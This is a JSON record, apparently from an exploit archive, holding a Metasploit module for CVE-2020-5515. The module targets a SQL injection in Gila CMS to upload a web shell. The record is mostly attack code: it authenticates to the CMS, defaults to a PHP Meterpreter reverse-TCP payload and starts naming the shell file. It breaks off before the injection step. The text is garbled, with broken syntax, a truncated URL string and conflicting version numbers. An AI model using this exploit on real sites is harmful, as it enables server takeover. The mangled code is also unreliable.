{
    "text": "vul_name : Gila CMS 1.11.8 - 'query' SQL Injection ( Metasploit )  ， vul_cve : CVE-2020-5515 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require \"net/http\" ， require \"uri\" ， require 'nokogiri' ， class MetasploitModule < Msf : Exploit ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : EXE ， super ( update_info ( info ,  ， 'Name' => 'Gila CMS 1.1.18.1 Shell Upload ' ,  ， 'Description' => %q{ ， This module exploits sql injection vulnerability in \"query\" parameter that found on Gila CMS 1.1.18.1 . ， } ,  ， 'Author' => [ 'th3d1gger' , 'Carlos Ramirez L. ( BillyV4 ) ' ]  ,  ， ' ，  [  ，  [ 'CVE' , 'CVE-2020-5515' ]  ,  ，  [ 'PACKETSTORM' , '158114' ]  ，  ]  ,  ， 'License' => 'MSF_LICENSE' ,  ， 'Platform' => 'PHP' ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => ，  [  ，  [  ， 'Automatic ( PHP In-Memory ) ' ,  ， 'Platform' => 'php' ,  ， 'Arch' => ARCH_PHP ,  ， 'Type' => : php_memory ,  ， 'Payload' => { 'BadChars' => \"'\" } ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' } ，  ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'USERNAME' ,  [ true , 'Email to login with' , 'user @ gilacms.com' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to login with' , 'password' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Uri for Gila CMS base' , '/gila-1.11.8/' ]  )  ,  ， OptString.new ( 'TARGETPATH' ,  [ true , 'Full Path to shell upload' , \"C : /xampp3/htdocs/gila-1.11.8/\" ]  )  #  ,  ，  ]  , self.class )  ，  # OptAddress.new ( 'SRVHOST' ,  [ true , 'HTTP Server Bind Address' , '127.0.0.1' ]  )  ,  ，  # OptInt.new ( 'SRVPORT' ,  [ true , 'HTTP Server Bind Port' , '4554' ]  )  ,  ，  # OptString.new ( 'FILENAME' ,  [ true , 'Payload filename' , 'payloader.elf' ]  )  ， end ， def primer ， end ， def username ， datastore [ 'USERNAME' ]  ， end ， def password ， datastore [ 'PASSWORD' ]  ， end ，  # some serving things ，  # def on_request_uri ( cli , req )  ，  #  @ pl = generate_payload_exe ，  # print_status ( \" # {peer} - Payload request received :  # {req.uri}\" )  ，  # send_response ( cli ,  @ pl )  ，  # end ， def gila ， uri = URI.parse ( ' ， http = Net : HTTP.new ( uri.host , uri.port )  ， request = Net : HTTP : Get.new ( uri.request_uri )  ， response = http.request ( request )  ， cookies = response.response [ 'set-cookie' ]  ， cookies = cookies.split ( ' ; ' )  [ 0 ]  ， request = Net : HTTP : Post.new ( uri )  ， request.set_form_data ( {\"username\" => username , \"password\" => password} )  ， request [ 'Cookie' ] = cookies ， request [ 'User-Agent' ] = 'Mozilla/5.0 ( X11 ; Linux x86_64 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/81.0.4044.92 Safari/537.36' ， response = http.request ( request )  ， print_good ( \"yayayay ! Authenticated with # {username} :  # {password}\" )  ， gsessionid = response.response [ 'set-cookie' ]  ，  @ fname = \" # {rand_text_alphanumeric ( rand ( 10 ) +6 ) }.PHP\"",
    "time": "2020.06.18"
}